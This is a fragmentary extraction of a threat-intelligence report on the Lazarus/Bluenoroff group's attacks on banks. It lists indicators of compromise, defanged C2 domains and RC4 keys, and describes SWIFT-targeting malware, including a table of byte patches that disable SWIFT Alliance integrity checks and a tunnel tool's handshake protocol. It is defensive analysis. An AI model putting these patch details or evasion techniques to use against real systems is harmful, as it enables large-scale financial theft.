bytes|7413f08e12f7a4b48342a4b530c8b785|\n\n\n-----\n\n**E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98**\nFull technical details about this malware are available in the Appendix.\n\nThe decrypted configuration file contains references to two previously known[1] Bluenoroff C2\nservers:\n\n  - **tradeboard.mefound[.]com:443**\n\n  - **movis-es.ignorelist[.]com:443**\n\nAnother file created around the same time was found in:\n\n  - **C:\\Windows\\Temp\\tmp3363.tmp.**\n\nIt included a short text file which contained the following text message:\n\n[SC] StartService FAILED 1053:\n\nThe service did not respond to the start or control request in a timely fashion.\n\nAdditional searches by events which occurred around the same time brought some evidence of\nother command line executable modules and Windows system tools being run on that day and\nlater. The following Prefetch files indicate the execution of other modules:\n\nExecutable Run Counter\n\nRUNDLL32.EXE 1\n\nRUNDLL32.EXE[2] 1\n\nFIND.EXE 6\n\nGPSVC.EXE 11\n\nSC.EXE 11\n\nNET.EXE 42\n\nNETSTAT.EXE 8\n\nMSDTC.EXE 7\n\nThis confirms the active reconnaissance stage of the attack.\n\nAccording to prefetch files for RUNDLL32.EXE, this executable was used to load msv2_0.dll\nand msv2_0.chm. References to these files were found in the prefetch data of this process.\n\n1 Bluenoroff is a Kaspersky Lab codename for a threat actor involved in financial targeted attacks. The\nmost well-known attack launched by the Bluenoroff group is the Bangladesh bank heist.\n2 Same executable was run with different command line\n\n|Executable|Run Counter|\n|---|---|\n|RUNDLL32.EXE|1|\n|RUNDLL32.EXE2|1|\n|FIND.EXE|6|\n|GPSVC.EXE|11|\n|SC.EXE|11|\n|NET.EXE|42|\n|NETSTAT.EXE|8|\n|MSDTC.EXE|7|\n\n\n-----\n\nNote: MSDTC.EXE and GPSVC.EXE are among the commonly used filenames of these\nattackers in the past. While these filenames may look legitimate, their location was different\nfrom the standard system equivalents.\n\nStandard Windows msdtc.exe binary is usually located in\n**%systemroot%\\System32\\msdtc.exe, while the attacker placed msdtc.exe in**\n**%systemroot%\\msdtc.exe for disguise. The path was confirmed from parsed prefetch files.**\nUnfortunately the attackers have already securely wiped the msdtc.exe file in the Windows\ndirectory. We were unable to recover this file.\n\nThe same applies to %systemroot%\\gpvc.exe which existed on the dates of the attack but was\nsecurely wiped by the attackers later.\n\nBased on the timestamps we found so far, it seems that the initial infection of Host1 occurred\nthrough access from a privileged account. We looked carefully at the events preceding the\ninfection time and found something suspicious in the Windows Security event log:\n\nDescription Special privileges assigned to new logon.\nSubject:\nSecurity ID: [REDACTED]\nAccount Name: [ADMIN ACCOUNT REDACTED]\nAccount Domain: [REDACTED]\nLogon ID: [REDACTED]\nPrivileges: SeSecurityPrivilege         SeBackupPrivilege\n**SeRestorePrivilege**\n**SeTakeOwnershipPrivilege** **SeDebugPrivilege**\n**SeSystemEnvironmentPrivilege         SeLoadDriverPrivilege**\n**SeImpersonatePrivilege**\n\nThen, we checked if the user ‘[ADMIN ACCOUNT REDACTED]' had logged into the same\nsystem in the past. According to the event logs this had never happened before the attackers\nused it. Apparently, this user logon had very high privileges (SeBackupPrivilege,\n**SeLoadDriverPrivilege, SeDebugPrivilege, SeImpersonatePrivilege), allowing the remote**\nuser to fully control the host, install system services, drivers, start processes as other users, and\nhave full control over other processes running in the system (i.e. inject code into their memory).\n\nNext, we searched for other event log records related to the activity of the same account, and\nfound several records suggesting that this account was used from Host1 to access other hosts\nin the same domain.\n\n|Description|Special privileges assigned to new logon. Subject: Security ID: [REDACTED] Account Name: [ADMIN ACCOUNT REDACTED] Account Domain: [REDACTED] Logon ID: [REDACTED] Privileges: SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege|\n|---|---|\n\n\n-----\n\n|Description|A logon was attempted using explicit credentials. ... Account Whose Credentials Were Used: Account Name: [ADMIN ACCOUNT REDACTED] Account Domain: [REDACTED] Logon GUID: {00000000-0000-0000-0000-000000000000} Target Server: Target Server Name: [REDACTED] Additional Information: [REDACTED] Process Information: Process ID: 0x00000000000xxxxx Process Name: C:\\Windows\\System32\\schtasks.exe Network Information: Network Address: - Port: - This event is generated when a process attempts to log on an account by explicitly specifying that account’s credentials. This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.|\n|---|---|\n\n\nThis indicates that the account was used to create new scheduled tasks on the remote hosts.\nThis is one of the popular ways to remotely run new processes and propagate infections during\ncyber attacks.\n\nThen we searched for other similar attempts to start schtasks.exe remotely on other hosts and\ncollected several of them.\n\n### Lateral Movement. Host2.\n\nThis host contained several unique and very large malware modules.\nThe following files were found on the system:\n\n|Filename|Size|MD5|\n|---|---|---|\n|C:\\Windows\\gpsvc.exe|3'449'344 bytes|1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae|\n|C:\\Windows\\Help\\srservice.chm|1'861'632 bytes|cb65d885f4799dbdf80af2214ecdc5fa (decrypted file MD5: ad5485fac7fed74d112799600edb2fbf)|\n|C:\\Windows\\Help\\srservice.hlp|3696 bytes|954f50301207c52e7616cc490b8b4d3c (config file, see description of ad5485fac7fed74d112799600edb2fbf)|\n|C:\\Windows\\System32\\srservice.dll|1'515'008 bytes|16a278d0ec24458c8e47672529835117|\n|C:\\Windows\\System32\\lcsvsvc.dll|1'545'216 bytes|c635e0aa816ba5fe6500ca9ecf34bd06|\n\n\n-----\n\nAll of this malware were general purpose backdoors and their respective droppers, loaders and\nconfiguration files. Details about this malware is available in the Appendix.\n\n### Lateral Movement. Host3.\n\nThe following malicious files were found on the system:\n\nFilename Size MD5\n\nC:\\Windows\\gpsvc.dat 901'555 bytes c1364bbf63b3617b25b58209e4529d8c\n\nC:\\Windows\\gpsvc.exe 753'664 bytes 85d316590edfb4212049c4490db08c4b\n\nC:\\Windows\\msdtc.bat 454 bytes 3b1dfeb298d0fb27c31944907d900c1d\n\nGpsvc.dat contains an encrypted payload for an unidentified loader. It's possible that the loader\nwas placed on a different host following the anti-forensic technique that we have observed\npreviously or gpsvc.exe is the loader but we are missing the secret passphrase passed via\ncommandline. The decrypted files are described in the Appendix to this report.\n\n### Cease of Activity\n\nIn several cases we investigated, once the attackers were confident they had been discovered,\nbecause they lost some of the compromised assets, they started wiping the remaining malware\npayloads. This indicates a skilled attacker, who cares about being discovered.\n\n## Other Known Operations\n\nThe attack on European financial institutions was implemented via a watering hole, a\ncompromised government website that had many regular visitors from local banks. However,\nthe same approach has been used in multiple other places around the world. The Polish\nwaterhole incident got much more public attention than the others due to the escalation of the\nalert to a higher level and the compromise of a government website.\n\nWe have seen a few other websites being compromised with the same symptoms and turned\ninto a watering hole through script injection or by placing exploit delivery code. We have found\nthem in the following countries:\n\n  - Russian Federation\n\n  - Australia\n\n  - Uruguay\n\n  - Mexico\n\n  - India\n\n  - Nigeria\n\n|Filename|Size|MD5|\n|---|---|---|\n|C:\\Windows\\gpsvc.dat|901'555 bytes|c1364bbf63b3617b25b58209e4529d8c|\n|C:\\Windows\\gpsvc.exe|753'664 bytes|85d316590edfb4212049c4490db08c4b|\n|C:\\Windows\\msdtc.bat|454 bytes|3b1dfeb298d0fb27c31944907d900c1d|\n\n\n-----\n\n  - Peru\n\nWhat connected most of the compromised websites was the JBoss application server platform.\nThis suggests that attackers may have an exploit for the JBoss server. Unfortunately we haven’t\nmanaged to find the exploit code yet. Nevertheless, we would like to recommend to all JBoss\napplication server administrators that they limit unnecessary access to their servers and check\nthe access logs for attack attempts.\n\nBanks were not the only Lazarus Group targets. This suggests that it has multiple objectives.\nWe have seen some unusual victims, probably overlapping with the wider Lazarus Group\noperations, i.e. a cryptocurrency business. When it comes to Bluenoroff, its typical list of targets\nincludes banks, financial and trading companies, casinos and cryptocurrency businesses.\n\nDetections of Lazarus/Bluenoroff malware are also distributed across the world. Here are some:\n\n\n-----\n\n## Conclusions\n\nLazarus is not just another APT actor. The scale of Lazarus operations is shocking. It has been\non a growth spike since 2011 and activities didn't disappear after Novetta published the results\nof its Operation Blockbuster research. All those hundreds of samples that were collected give\nthe impression that Lazarus is operating a factory of malware, which produces new samples via\nmultiple independent conveyors.\n\nWe have seen it using various code obfuscation techniques, rewriting its own algorithms,\napplying commercial software protectors, and using its own and underground packers. Lazarus\nknows the value of quality code, which is why we normally see rudimentary backdoors being\npushed during the first stage of infection. Burning those doesn't cause too much impact on the\ngroup. However, if the first stage backdoor reports an interesting infection it starts deploying\nmore advanced code, carefully protecting it from accidental detection on disk. The code is\nwrapped into a DLL loader or stored in an encrypted container, or maybe hidden in a binary\nencrypted registry value. It usually comes with an installer that only the attackers can use,\nbecause they password protect it. It guarantees that automated systems - be it public sandbox\nor a researcher's environment - will never see the real payload.\n\nMost of the tools are designed to be disposable material that will be replaced with a new\ngeneration as soon as they are burnt. And then there will be newer, and newer, and newer\nversions. Lazarus avoids reusing the same tools, the same code, and the same algorithms.\n\"Keep morphing!\" seems to be its internal motto. Those rare cases when it is caught with the\nsame tools are operational mistakes, because the group seems to be so large that one part\ndoesn't know what the other is doing.\n\nAll this level of sophistication is something that is not generally found in the cybercriminal world.\nIt's something that requires strict organization and control at all stages of the operation. That's\nwhy we think that Lazarus is not just another APT actor.\n\nOf course such a process requires a lot of money to keep running the business, which is why\nthe appearance of the Bluenoroff subgroup within Lazarus was logical.\n\nBluenoroff, as a subgroup of Lazarus, is focused only on financial attacks. It has reverse\nengineering skills and spends time tearing apart legitimate software, implementing patches for\nSWIFT Alliance software, and finding ways and schemes to steal big money. Its malware is\ndifferent and the attackers aren't exactly soldiers that hit and run. Instead they prefer to make an\nexecution trace to be able to reconstruct and quickly debug the problem. They are field\nengineers that come when the ground is already cleared after the conquest of new lands.\n\nOne of Bluenoroff's favorite strategies is to silently integrate into running processes without\nbreaking them. From the perspective of the code we've seen it looks as if it is not exactly looking\nfor hit and run solutions when it comes to money theft. Its solutions are aimed at invisible theft\nwithout leaving a trace. Of course, attempts to move around millions of USD can hardly remain\n\n\n-----\n\nunnoticed but we believe that its malware might now be secretly deployed in many other places\n\n- and it doesn't trigger any serious alarms because it's much more quiet.\n\nWe would like to note, that in all the observed attacks against banks that we have analyzed,\nSWIFT software solutions running on banks' servers haven't demonstrated or exposed any\nspecific vulnerability. The attacks were focused on the banks’ infrastructure and staff, exploiting\nvulnerabilities in commonly used software or websites, bruteforcing passwords, using\nkeyloggers and elevating privileges. However, the design of inter-banking transactions using a\nbank's own server running SWIFT software suggests that there are personnel responsible for\nthe administration and operation of the SWIFT server. Sooner or later the attackers find these\nusers, gain their necessary privileges and access the server connected to the SWIFT\nmessaging platform. With administrative access to the platform, they can manipulate the\nsoftware running on the system as they wish. There is not much that can stop them, because\nfrom a technical perspective it may not differ from what authorized and qualified engineers do:\nstarting and stopping services, patching software, or modifying databases.\n\nTherefore, in the breaches we analyzed, SWIFT as an organization hasn’t been directly at fault.\nMore than that, we have witnessed SWIFT trying to protect its customers by implementing the\ndetection of database and software integrity issues. We believe that this is the right direction\nand has to be extended with full support. Complicating patches of integrity checks further may\ncreate a serious threat to the success of further operations run by Lazarus/Bluenoroff against\nbanks worldwide.\n\nTo date, the Lazarus/Bluenoroff group has been one of the most successful in large scale\noperations against financial industry. We believe that it will remain one of the biggest threats to\nthe banking sector, finance and trading companies as well as casinos, for years to come.\n\nAs usual, defense against attacks such as those from Lazarus/Bluenoroff should include a multilayered approach. Kaspersky Lab products include special mitigation strategies against this\ngroup, as well as many other APT groups we track.

Also, it crafts several local filepaths, the purpose of which\nisn't clear. Not all have reference in the code and they could be copy-pasted code or part of a\ncommon file in the framework. The paths are represented with the following strings:\n\n  - %DRIVE%:\\MSO10\\LATIN.SHP\n\n  - %DRIVE%:\\MSO10\\ENGDIC.LNG\n\n  - %DRIVE%:\\MSO10\\ADDT.REF\n\n  - %DRIVE%:\\MSO10\\MSE.LIV\nUpon starting it makes five attempts to read file C:\\MSO10\\LATIN.SHP with an interval of\n100ms. If the LATIN.SHP container is not found or has an invalid signature, the log record will\ncontain the following message: \"NR-PR\", which we assume indicates a PRoblem loading\nmodule codenamed \"NR\". The name \"NR\" is probably a reference to the printer helper program\ncalled \"nroff\" used by SWIFT Alliance software. The origins of the nroff name go back to a Unix\n[text-formatting program according to Wikipedia.](https://en.wikipedia.org/wiki/Nroff)\n\n\n-----\n\nThe file is read successfully if its size is larger than or equal to a hardcoded value of 35,260\nbytes. After that the module decrypts the file with an RC4 algorithm using a hardcoded\nencryption key:\n**4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.**\nThis hardcoded key is quite unique and has been discovered in few other places, including in\nother tools from the set of malware used to attack SWIFT software and within the Wiper Tool\ndiscovered in Bangladesh in early 2016 (MD5: 5d0ffbc8389f27b0649696f0ef5b3cfe). It was also\n[used in another tool to encrypt configuration files as reported](http://baesystemsai.blogspot.sg/2016/04/two-bytes-to-951m.html) by BAE Systems.\n\nThe decrypted data from the file is validated by checking the magic header of the data, which\nshould be 0xA0B0C0D0 value. The file contains a configuration of 35,260 bytes which is copied\nto a reserved memory and a sequence of data blocks of 1096 bytes each. The number of blocks\nmay vary, the module reads them all and stores them in a linked list structure.\n\nThere is an internal logging feature implemented in the current module, which keeps a text log\nin C:\\MSO10\\ENGDIC.LNG. The text records are stored in lines of the following format:\n\n**[%Hour%:%Minute%:%Second%] [%Process_PID%] %Message%\\r\\n**\nThe message may contain the following prefixes:\n\n  - **[ERROR]**\n\n  - **[INFO]**\n\n  - **[WARNING]**\n\nThis executable is designed to be called with three parameters:\n**_fltmsg.exe <mode> <print file> <output-path>_**\nThe first parameter is a number 1 or 2. If any other value is passed to the executable it simply\nsaves it to the log in the format of \"NR-PR-P %mode%\". We assume that \"NR-PR-P\" is\ninterpreted by the attackers as \"nroff problem parameter\".\n\nMode 1 means that the module shall select the output path automatically, which contains the\nfollowing string template: \"#%04d%04d.prt\", otherwise the output path is copied from the third\ncommand line argument.\n\nFor recognized modes 1 and 2 the module saves a backup for every \"print file\" passed to it via\ncommand line that has the extension \".prt\", \".out\" or \".txt\". The backups are stored in one of the\nfollowing directories:\n\n  - C:\\MSO10\\P %N%\\MOT\\\n\n  - C:\\MSO10\\R %N%\\MOT\\\n\n  - C:\\MSO10\\N %N%\\MOT\\\nWhere %N% is a sequential integer number.\n\nThe malware is an information harvester. It processes files passed to it, parses them and\nsearches for specific SWIFT codes, such as:\n\n  - 28C: Statement Number\n\n\n-----\n\n  - 25: Account Identification\n\nIts main purpose is to accumulate information about transactions passed through it, saving\nSender and Receiver, Account and Statement Numbers as well as some other data included in\nparsed files. The files passed to it are allegedly in SWIFT format, which suggests that the\nattackers were closely accustomed to internal SWIFT documentation or carefully reverse\nengineered the format. It recognizes the following format tags:\n\n  - 515 (M51)\n\n  - 940 (M94) - start of day balance\n\n  - 950 (M95) - end of day balance\n\nWhen such files are found, it logs them into the log folder drive:\\MSO10 and saves a copy.\nThe RC4-encrypted file we found (LATIN.SHP) contained the following strings after decryption:\n\n  - _D:\\Alliance\\Entry\\database\\bin\\sqlplus.exe_\n\n  - _D:\\Alliance\\Entry\\common\\bin\\win32_\n\n  - _D:\\Alliance\\Entry_\n\n  - _C:\\MSO10\\fltmsg.exe_\n\n  - _C:\\MSO10\\MSO.DLL_\n\n  - _C:\\MSO10\\MXS.DLL_\n\n  - _\\\\127.0.0.1\\share_\n\n  - _localhost\\testuser_\n\n  - _\\\\127.0.0.1\\share\\_\n\nIn the older case from Bangladesh the config contained SWIFT identifiers to hide in SWIFT\nstatements.\n\n#### Malware 2: SWIFT Protection Mangler\n\nMD5: 198760a270a19091582a5bd841fbaec0\nSize: 71'680 bytes\nDiscovered path: C:\\MSO10\\MSO.dll\nCompiled on: 2016.08.18 22:24:44 (GMT)\nLinker version: 10.0\nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nInternal Bluenoroff module tag: PM\nUsed in: Incident #1\n\nThe compilation timestamp indicates the malware was compiled in the days preceding the\nattack on the bank.\n\nThis malware tool is used to patch some SWIFT Alliance software modules in the memory to\ndisable certain protection mechanisms that were implemented to detect direct database\nmanipulation attempts. The code was most likely created by the same developer that created\nSWIFT Information Harvester (MD5: 0abdaebbdbd5e6507e6db15f628d6fd7). Like the\n\n\n-----\n\ninformation harvester it creates a \"MSO10\" directory on the logical drive where the Windows\nsystem is installed, i.e. C:\\MSO10.\n\nIt also crafts several local filepaths, the purpose of which isn't clear. Not all have reference in\nthe code and could be a copy-pasted code or part of common file in the framework:\n\n  - %DRIVE%:\\MSO10\\LATIN.SHP\n\n  - %DRIVE%:\\MSO10\\ENGDIC.LNG\n\n  - %DRIVE%:\\MSO10\\ADDT.REF\n\n  - %DRIVE%:\\MSO10\\MSE.LIV\n\nUpon starting it makes five attempts to read file C:\\MSO10\\LATIN.SHP with an interval of\n100ms. If the LATIN.SHP container is not found or is invalid, the log will contain the following\nmessage: \"PM-PR\". The file is read successfully if its size is larger or equal to a hardcoded\nvalue of 35,260. After that the module decrypts the file with an RC4 algorithm using a\nhardcoded encryption key: 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF.\n\nThe decrypted data from the file is validated by checking the magic header of the data, which\nshould be 0xA0B0C0D0 value.\n\nThe file contains a configuration block of 35,260 bytes which is copied to a reserved memory\nand a sequence of data blocks of 1096 bytes long. The number of blocks may vary, the module\nreads them all and stores them in a linked list structure.\n\nIf the LATIN.SHP file is found then the module simply counts the number of records in it and\nproceeds with patching the target file, which is described futher. If it is not found or the file magic\nbytes differ from expected after decryption, then the patching does not happen and the code\nsimply drops execution.\n\nThere is an internal logging feature implemented in the current module, which keeps text log in\nC:\\MSO10\\ENGDIC.LNG. The following log messages may appear in this file in plaintext:\n\n|Log message format|Description of values|\n|---|---|\n|PatchMemory(%s, %d)|%s - current executable filename %d - 0 or 1 (0 - unpatch operation, 1 - patch operation)|\n|[PatchMemory] %s|%s - current executable filename|\n|[PatchMemory] LoadLibraryA(%s) = %X|%s - additional DLL filename %X - additional DLL image base address|\n|[WorkMemory] %s %d End|%s - executable name to be patched %d - process ID value This is printed in case of failure to open process|\n\n\n-----\n\n|[WorkMemory] pid=%d, name=%s|%d - process ID value %s - executable name to be patched|\n|---|---|\n|[Patch] 1 Already Patched %s|%s - executable name to be patched|\n|[Unpatch] 1 Already Unpatched %s|%s - executable name to be patched|\n|[Patch] 1 %s|%s - executable name to be patched|\n|[Patch] 1 %s|%s - executable name to be patched|\n|P[%u-%d] %d|%u - process ID which is patched %d - patch index (starts from 0), corresponds to patch block %d - contains last WinAPI error code This is printed in case of failure to patch memory|\n|P[%u-%d] OK|%u - process ID which is patched %d - patch index (starts from 0), corresponds to patch block|\n|[Patch] 2 Already Patched %s|%s - executable name to be patched|\n|[Unpatch] 2 Already Unpatched %s|%s - executable name to be patched|\n|[Patch] 2 %s|%s - executable name to be patched|\n|[Patch] 2 %s|%s - executable name to be patched|\n\n\nThe module has seven embedded blocks of 0x130 bytes long that contain patch target\ninformation.\n\nEach block seems to have four slots of 0x4C bytes with patch information. However, only the\nfirst slot per module is used at this point. Each slot contains information for just two code\nmodifications.\n\nThe patch slots include the size of the patch, and the relative path to the module to be patched\non disk, offset to the patched bytes (containing the relative virtual address) and original bytes.\nThe patcher verifies that the original bytes are in place before modifying the code. The patch\nprocedure can also do unpatching by design, however this feature is currently unused.\n\nThe first slot is a patch for the liboradb.dll library which seems to be essential and is applied in\nall cases. Other patches are designed for specific executables that the current SWIFT Patcher\nDLL module is loaded in. It searches for a corresponding patch that matches the current\nprocess executable filename and applies only that patch.\n\nThe following table contains an interpretation of the patch-blocks embedded into the binary. The\ntable omits empty slots and shows only valid patch instructions:\n\n\n-----\n\n|Block|Module|Patch RVA|Original code|Replacement|Description|\n|---|---|---|---|---|---|\n|1|liboradb.dll|0x8147e|04|00|Disables checksum verification|\n|2|Block is Unused|||||\n|3|MXS_cont.exe|0xff49|e8c2fbffff|b801000000|Disables internal security checks.|\n|||0x10b0c|e8c2fbffff|b801000000||\n|4|mxs_ha.exe|0x65a9|e8c2fbffff|b801000000|Disables internal security checks.|\n|||0x716c|e8c2fbffff|b801000000||\n|5|sis_sndmsg.exe|0x49719|e8c2fbffff|b801000000|Disables internal security checks.|\n|||0x4a2dc|e8c2fbffff|b801000000||\n|6|SNIS_sendmsg.exe|0xa8119|e8c2fbffff|b801000000|Disables internal security checks.|\n|||0xa8cdc|e8c2fbffff|b801000000||\n|7|SNSS_cont.exe|0x7849|e8c2fbffff|b801000000|Disables internal security checks.|\n|||0x840c|e8c2fbffff|b801000000||\n\n\nSWIFT Alliance software binary tools are linked with file \"saa_check.cpp\", which provides basic\nsecurity checks and validates the integrity of the database. The patches are applied to the\nmodules to disable these checks and prevent the detection of database inconsistency. The file\nselection is not random, as far as the SWIFT server environment is a complex of executable\nfiles with complicated relations, the attackers identified all executables that implemented new\nsecurity features and patched them off. We have checked all other binaries on the analyzed\nservers and none of other applications were linked with saa_check.cpp, except those in the\npatchlist.\n\nThe patcher DLL has to be loaded into the address space of the target process to work. It is not\ndesigned to patch other processes.\n\n\n-----\n\n#### Malware 3: SWIFT Files Hook\n\nMD5: f5e0f57684e9da7ef96dd459b554fded\nSize: 91'136 bytes\nDiscovered path: C:\\MSO10\\MXS.dll\nCompiled on: 2016.08.18 22:24:31 (GMT)\nLinker version: 10.0\nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nInternal Bluenoroff module tag: HD (alternative: HF)\nUsed in: Incident #1\n\nThe compilation timestamp indicates the malware was compiled during the days of the attack on\nthe bank.\n\nIt is very similar to SWIFT Information Harvester and SWIFT Protection Mangler. Like the\ninformation harvester it creates a \"MSO10\" directory on the logical drive where the Windows\nsystem is installed, i.e. C:\\MSO10.\n\nSimilarly, it crafts several local filepaths:\n\n  - %DRIVE%:\\MSO10\\LATIN.SHP\n\n  - %DRIVE%:\\MSO10\\ENGDIC.LNG\n\n  - %DRIVE%:\\MSO10\\ADDT.REF\n\n  - %DRIVE%:\\MSO10\\MSE.LIV\n\nUpon starting it makes five attempts to read file C:\\MSO10\\LATIN.SHP with an interval of\n100ms.

Any call to create a new process,\nwhich starts one of two recognized executables \"nroff\" or \"printhelper\", is modified.

It was\nused to start a SWIFT Alliance software tool via a custom application starter that most probably\ntampered with the new process. The fveupdate.dll module was not recovered from the system.\n\n#### Malware 5: TCP Tunnel Tool\n\nMD5: e62a52073fd7bfd251efca9906580839\nDate discovered: 2016.08.12 01:11:31\nDiscovered path: C:\\Windows\\winhlp.exe\nSize: 20'480 bytes\nKnown as: winhlp.exe, msdtc.exe\nLast start date: 2016.08.12 21:59\nStarted by: svchost.exe (standard Windows signed binary)\nCompiled on: 2014.09.17 16:59:33 (GMT)\nType: PE32 executable (GUI) Intel 80386, for MS Windows\nLinker version: 6.0\nUsed in: Incident #1\n\nThis application is a tool that works as a simple TCP relay that encrypts communication with C2\nand contains remote reconfiguration capability. It has to be started with at least two parameters\ncontaining host IP and port. Two additional optional parameters may define the destination\nserver IP and port to relay network connections to. The destination server IP and port can be\nretrieved and reconfigured live from C2. Let's refer to these pairs of IP/ports as HostA/PortA and\nHostB/PortB respectively.\n\nWhen the tool starts it attempts to connect to the C2 server, which starts from the generation of\na handshake key. The handshake key is generated via a simple algorithm such as the following:\n\n|options is used:|Col2|\n|---|---|\n|Option|Description|\n|-n <Name>|Find token by process name|\n|-p <PID>|Find token by process ID|\n|-s <SESSID>|Find token by Terminal session ID|\n\n\n-----\n\ni = 0;\ndo\n{\nkey[i] = 0xDB * i ^ 0xF7;\n++i;\n} while ( i < 16 );\n\nThis algorithm generates the following string:\n\nASCII Hexadecimal\n\n,-./()*+$%&\\' !\" 2c 2d 2e 2f 28 29 2a 2b 24 25 26 27 20 21 22\n\nNext, it generates a message body, a string of bytes from 64 to 192 bytes long. The fifth\nDWORD in the message is replaced with special code 0x00000065 (\"e\" character). Then it\nencrypts the message with a handshake key and sends it to the C2 server with the data block\nlength prepended to that buffer.\n\nThis is what such a packet looks like (blue rows are encrypted with RC4 and handshake key):\n\nOffset (bytes) Size (bytes) Description\n\n0 4 Size of the rest of data in the message\n\n4 16 Random data\n\n20 4 **Special code 0x00000065 (\"e\")**\n\n24 >=64 Random data\n\nIt expects similar behaviour from the server. The server responds with similar packet, where the\nfirst DWORD is the size of the rest of the packet and the only meaningful value is at offset 0x14,\nwhich must contain 0x00000066 (\"f\") or the handshake is not successful.\n\nIf the handshake is successful, the tool spawns a dedicated thread to deal with the C2\nconnection.\n\nIt uses RC4 encryption to communicate with the C2 over TCP with a hardcoded 4-bytes key\nvalue: E2 A4 85 92.\n\nThe analyzed sample uses binary protocol for communication, exchanging messages in fixed\nlength blocks of 40 bytes, which are encrypted with RC4 as mentioned above. Each such block\ncontains a DWORD at offset 0x4 describing a control code used in the protocol. Other fields in\nthe block may contain additional information or be set to a randomly generated number for\ndistraction.\n\n|ASCII|Hexadecimal|\n|---|---|\n|,-./()*+$%&\\' !\"|2c 2d 2e 2f 28 29 2a 2b 24 25 26 27 20 21 22|\n\n|Offset (bytes)|Size (bytes)|Description|\n|---|---|---|\n|0|4|Size of the rest of data in the message|\n|4|16|Random data|\n|20|4|Special code 0x00000065 (\"e\")|\n|24|>=64|Random data|\n\n\n-----\n\n|Client|Col2|Server|Col4|\n|---|---|---|---|\n|Control Code|Meaning|Control Code|Meaning|\n|0x10001|Ready to work|0x10000|Keep-Alive|\n|0x10008|Task Done|0x10002|Start tunnelling with HostB|\n|||0x10003|Set new HostB/PortB|\n|||0x10004|Get current HostB/PortB|\n|||0x10006|Terminate immediately|\n\n\nFor the Control Code 0x10003, additional information including IP and port numbers are\ntransferred in the same message block at offsets 0x10 for IP and 0x14 for port.\n\nThe tool will not start connecting to HostB until it receives a 0x10002 command to start the\ntunnelling process. When this happens it will open an additional, independent TCP session with\nHostA, will do a handshake, and then pass all data back and forth without modification.\n\nOther variants of the tool were found in different places:\n\n02f75c2b47b1733f1889d6bbc026157c - uploaded to a multiscanner from Bangladesh.\n459593079763f4ae74986070f47452cf - discovered in Costa Rica.\nce6e55abfe1e7767531eaf1036a5db3d - discovered in Ethiopia.\n\nAll these tools use the same hardcoded RC4 key value of E2 A4 85 92.\n\n#### Malware 6: Active Backdoors\n\nMD5: 2ef2703cfc9f6858ad9527588198b1b6\nType: PE32 executable (GUI) Intel 80386, for MS Windows\nSize: 487'424 bytes\nName: mso.exe\nLink time: 2016.06.14 11:56:42 (GMT)\nLinker version: 6.0\nUsed in: Incident #1, Incident #2\n\nThis module is linked with opensource SSL/TLS suite mbedTLS (aka PolarSSL) as well as zLib\n1.2.7 and libCURL libraries.\n\nCommand line options:\nIMEKLMG.exe [filepath] [-i] [<C2_IP> <C2_PORT> ...] [-s]\n\n\n-----\n\n-i self-install in the registry and restart self with previous path as argument.\n\n[filepath] sleep for 3 seconds, delete the specified path, restart self with option \"-s\".\n<C2_IP> <C2_PORT> ... one or more pairs of C2 IP and port can be passed here.\n-s start the main backdoor mode\n\nStarting the executable with no option is equivalent to starting with \"-i\", which initiates a\nsequence of restarts eventually leading to self-installation into the autorun key and user's\n%App_Data% directory.

This suggests backdoor reuse in those countries. It has\nthe following properties:\n\nName: IMEKLMG.exe.dmp\nMD5: 06cd99f0f9f152655469156059a8ea25\nSHA1: 77c7a17ccd4775b2173a24cd358ad3f2676c3452\nFile size: 376832 bytes\nFile type: PE32 executable (GUI) Intel 80386, for MS Windows\nLink time: 2016.06.14 11:56:42 (GMT)\nLinker version: 6.0\n\nAnother similar file was discovered in February 2017, distributed from a Nigerian webserver.

However, it contains some\ndifferences and improvements. It uses an external file to store configuration, located at\n%SYSTEMROOT%\\systray.dat. The config has a fixed size of 182 bytes and has the following\nstructure:\n\n\n-----\n\nXORed with 0xDE\n\n|Random 4 bytes|Magic Value: 0x12458FAE|Other data|\n|---|---|---|\n\n\nSimilar to other backdoors, it uses XOR operation on the DNS response. The XOR DWORD\nconstant is different here: 0xCBF9A345. The sample contains the following default hardcoded\nC2 address:\n\n  - **tradeboard.mefound[.]com:443**\n\nTo complicate analysis, the developer has implemented a protocol with dynamically changing\nconstants depending on the variant of the malware. So far, the backdoor \"speaks the same\nlanguage\" but with a different \"dialect\". This is implemented through a different base for all\nmessages.

The application is designed to\nrun as a service, however it can also start and work as a standalone non-service process. It\nregisters with the name of \"helpsvcs\". The code is organized in classes, one of which, the main\napplication class, has a static text variable set to \"PVS\", which seems to be unused in the code.\nThis service relies on command line arguments passed as an integer defining the port number\nthat it will listen to in the future. This is a reduced minimalistic way of configuring and using the\n\n\n-----\n\nbackdoor in listening mode, however there is a class that is responsible for loading or saving full\nconfiguration block from/to the registry.\n\nThe registry value used to store the configuration depends on the parameter value\n(%parameter%) passed to the function. The registry configuration is located at\nHKCR\\NR%parameter%\\Content Setting.\n\nThe main service procedure generates a unique instance ID which is set to pseudo-randomly\nselected 8 bytes. Some previous versions of the code relied on some pseudo-random values\nderived from the current time and MAC addresses of available network cards, but then was\nchanged to a hardware independent value.\n\nThis backdoor takes care of enabling ports in the Windows Firewall by creating a new firewall\nrule named \"Windows Firewall Remote Management\" using netsh.exe tool on Windows, which\nenables an incoming connection to any executable on the TCP port that is currently used by the\nbackdoor. In case this rule has different name in other samples, it's quite easy to find it,\nbecause it doesn't specify which group of rules it belongs to, unlike all other default Windows\nFirewall rules. Sorting Firewall rules by group name may quickly reveal such an odd rule:\n\nThe backdoor provides process and file management, as well as the creation of TCP connection\nrelays.\n\nAnother backdoor based on the same code was found in the same bank, however it was made\nas a standalone executable instead of a DLL.

